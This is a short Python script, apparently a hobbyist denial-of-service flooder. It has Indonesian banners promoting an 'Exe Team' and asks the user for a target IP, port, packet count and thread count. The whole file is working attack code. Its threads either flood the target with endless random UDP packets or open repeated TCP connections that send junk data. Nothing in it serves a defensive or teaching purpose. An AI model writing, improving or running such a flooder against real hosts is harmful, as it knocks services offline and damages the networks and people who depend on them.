#!/usr/bin/env python3
import random
import socket
import threading

print       (" - - > 𝙂𝙯𝙖𝙖𝙭𝙮𝙯!! < - - ")
print       (" - - > 𝙂𝙯𝙖𝙖𝙭𝙮𝙯!!!! < - - ")
print       (" - - > Join Exe Team <- - ")                                   
print       (" - - > Rename Pm Gw !! < - - ")
print       (" - - > 𝙂𝙯𝙖𝙖𝙭𝙮𝙯 Nih dek  < - - ")
print       (" - - > Tuh link nya Join!! < - - ")
print       (" - - >  EXE TEAM KATA ILHAM  < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" GAS DDoS? (y/n):"))
times = int(input(" Paket:"))
threads = int(input(" Theread:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Paket From 𝙂𝙯𝙖𝙖𝙭𝙮𝙯!!! ")
		except:
			print("[!] 𝙂𝙯𝙖𝙖𝙭𝙮𝙯 Kirim Paket!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Paket From 𝙂𝙯𝙖𝙖𝙭𝙮𝙯!!! ")
		except:
			s.close()
			print("[] 𝙂𝙯𝙖𝙖𝙭𝙮𝙯 Kirim Paket!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()